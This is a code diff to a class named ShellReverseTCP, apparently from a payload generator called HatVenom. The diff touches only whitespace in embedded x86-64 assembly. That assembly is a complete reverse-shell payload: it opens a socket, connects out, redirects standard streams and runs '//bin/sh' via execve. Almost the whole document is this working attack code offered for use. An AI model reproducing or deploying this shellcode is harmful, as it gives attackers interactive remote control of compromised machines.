@@ -36,17 +36,17 @@ class ShellReverseTCP(HatVenom):
 
         shellcode = f"""
         start:
-	        xor rdi, rdi
-	        mov dil, 0x2
-	        xor rsi, rsi
-	        mov sil, 0x1
-	        xor rdx, rdx
+	    xor rdi, rdi
+	    mov dil, 0x2
+	    xor rsi, rsi
+	    mov sil, 0x1
+	    xor rdx, rdx
 
-	        xor rax, rax
-	        mov al, 2
-	        ror rax, 0x28
-	        mov al, 0x61
-	        mov	r12, rax
+	    xor rax, rax
+	    mov al, 2
+	    ror rax, 0x28
+	    mov al, 0x61
+	    mov r12, rax
             syscall
 
             mov	r9, rax
@@ -63,7 +63,7 @@ class ShellReverseTCP(HatVenom):
             syscall
 
             xor	rsi, rsi
-	        inc	rsi
+	    inc rsi
             add	r12b, 0x2
             mov	rax, r12
             syscall
@@ -73,24 +73,24 @@ class ShellReverseTCP(HatVenom):
             mov	rax, r12
             syscall
 
-	        mov	rdi, rax
-	        xor	rsi, rsi
-	        add	r12b, 0x3c
-            mov	rax, r12
+	    mov rdi, rax
+	    xor rsi, rsi
+	    add r12b, 0x3c
+            mov rax, r12
             syscall
 
             inc	rsi
             mov rax, r12
             syscall
 
-	        xor rsi, rsi
-	        push rsi
-	        mov rdi, 0x68732f6e69622f2f
-	        push rdi
-	        mov rdi, rsp
-	        xor rdx, rdx
+	    xor rsi, rsi
+	    push rsi
+	    mov rdi, 0x68732f6e69622f2f
+	    push rdi
+	    mov rdi, rsp
+	    xor rdx, rdx
 
-	        sub	r12b, 0x1f
+	    sub r12b, 0x1f
             mov	rax, r12
             syscall
         """
